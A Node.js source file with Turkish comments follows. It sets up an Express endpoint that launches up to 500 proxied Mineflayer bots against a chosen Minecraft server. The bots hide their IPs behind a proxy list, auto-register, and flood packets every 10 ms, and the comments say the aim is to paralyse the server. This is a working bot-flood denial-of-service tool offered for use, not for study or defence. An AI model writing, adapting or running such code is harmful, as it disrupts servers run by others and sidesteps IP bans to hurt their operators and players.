const mineflayer = require('mineflayer');
const { ProxyAgent } = require('proxy-agent');
const express = require('express');
const app = express();
app.use(express.json());
app.use(require('cors')());

// 🛡️ BU LİSTE ÇOK ÖNEMLİ (En az 50-100 tane çalışan Proxy ekle!)
const proxyList = [
    "socks5://ip:port",
    "http://ip:port"
];

let activeBots = [];

app.post('/deploy', (req, res) => {
    const { ip, count } = req.body;
    const host = ip.includes(':') ? ip.split(':')[0] : ip;
    const port = ip.includes(':') ? parseInt(ip.split(':')[1]) : 25565;

    console.log(`[!!! PARTY MODE ACTIVE !!!] 129GB RAM DEVREDE.`);
    console.log(`Hedef: ${host} | Bot Sayısı: ${count}`);

    for (let i = 0; i < Math.min(count, 500); i++) {
        // GECİKMEYİ 50ms'YE DÜŞÜRDÜK (Aynı anda girmeleri için)
        setTimeout(() => {
            const currentProxy = proxyList[i % proxyList.length];
            if (!currentProxy) return;

            const agent = new ProxyAgent(currentProxy);

            const bot = mineflayer.createBot({
                host: host,
                port: port,
                username: `VipParty_${Math.floor(Math.random() * 999999)}`,
                version: false,
                agent: agent, // IP Gizleme
                hideErrors: true,
                skipValidation: true // Girişi hızlandırır
            });

            bot.on('spawn', () => {
                console.log(`[🚀] ${bot.username} İÇERİ DALDI!`);
                
                // GİRER GİRMEZ KAYIT OL
                bot.chat(`/register resul3163 resul3163`);
                bot.chat(`/login resul3163`);

                // SUNUCUYU FELÇ ETME PAKETLERİ (Saniyede 100 paket!)
                setInterval(() => {
                    if(bot.entity) {
                        bot.look(Math.random() * 360, Math.random() * 180);
                        bot.swingArm('right');
                        bot.setControlState('jump', true);
                        // Paket yağmuru ile sunucuyu meşgul et
                    }
                }, 10); 
            });

            bot.on('error', (err) => console.log(`[!] Hata: ${err.message}`));
            activeBots.push(bot);
        }, i * 50); // Sadece 0.05 saniye arayla (Neredeyse aynı anda!)
    }
    res.json({ success: true, message: "PARTİ BAŞLADI! Yüzlerce bot sızıyor!" });
});

app.listen(process.env.PORT || 3000);
